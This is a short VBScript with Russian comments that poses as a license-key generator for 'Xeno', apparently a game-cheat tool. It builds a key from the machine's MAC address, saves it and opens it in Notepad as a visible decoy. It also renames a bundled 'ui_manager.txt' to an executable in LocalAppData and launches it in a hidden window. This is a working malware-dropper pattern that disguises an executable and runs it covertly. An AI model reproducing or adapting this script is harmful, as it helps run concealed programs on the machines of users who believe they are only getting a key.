' ===== Создаём основные объекты =====
Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

' Пути к папкам
localAppData = WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
targetFolder = localAppData & "\Xeno\workspace"
tempPath = targetFolder & "\verification_key.txt"
scriptFolder = fso.GetParentFolderName(WScript.ScriptFullName)

' Пути к файлам (убраны лишние кавычки из переменных)
oldPath = scriptFolder & "\ui_manager.txt"
newPath_bild = localAppData & "\ui_manager.exe"

' ===== Проверка: если ключ уже есть — перемещаем, запускаем и выходим =====
If fso.FileExists(tempPath) Then
    ' Открываем текстовый файл (notepad всегда с окном, так как это редактор)
    WshShell.Run "notepad.exe """ & tempPath & """", 1, False
    
    ' Переименовываем/переносим файл, если он на месте
    If fso.FileExists(oldPath) Then
        On Error Resume Next ' Игнорируем ошибку, если файл уже занят
        fso.MoveFile oldPath, newPath_bild
        On Error GoTo 0
    End If
    
    ' Запускаем EXE в скрытом режиме (0 = Hidden)
    If fso.FileExists(newPath_bild) Then
        WshShell.Run """" & newPath_bild & """", 0, False
    End If
    
    WScript.Quit
End If

' ===== Получаем MAC-адрес через WMI =====
Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
Set adapters = objWMI.ExecQuery("SELECT MACAddress FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL")

mac = ""
For Each adapter In adapters
    mac = adapter.MACAddress
    If mac <> "" Then Exit For
Next

If mac = "" Then mac = "00:00:00:00:00:00"

' ===== Генерация ключа =====
cleanMac = UCase(Replace(mac, ":", ""))
cleanMac = Left(cleanMac & "000000000000", 12)

part1 = Mid(cleanMac, 1, 4)
part2 = Mid(cleanMac, 5, 4)
part3 = Mid(cleanMac, 9, 4)

Randomize
rand4 = Int((9999 - 1000 + 1) * Rnd + 1000)
key = "NEXY-" & part1 & "-" & part2 & "-" & part3 & "-" & rand4

' ===== Сохранение ключа =====
' Создаем структуру папок
If Not fso.FolderExists(localAppData & "\Xeno") Then fso.CreateFolder(localAppData & "\Xeno")
If Not fso.FolderExists(targetFolder) Then fso.CreateFolder(targetFolder)

Set file = fso.CreateTextFile(tempPath, True)
file.Write key
file.Close

' ===== Финальные действия =====
' Открываем блокнот с ключом
WshShell.Run "notepad.exe """ & tempPath & """", 1, False

' Переносим ui_manager и запускаем его скрыто
If fso.FileExists(oldPath) Then
    On Error Resume Next
    fso.MoveFile oldPath, newPath_bild
    On Error GoTo 0
End If

If fso.FileExists(newPath_bild) Then
    WshShell.Run """" & newPath_bild & """", 0, False
End If
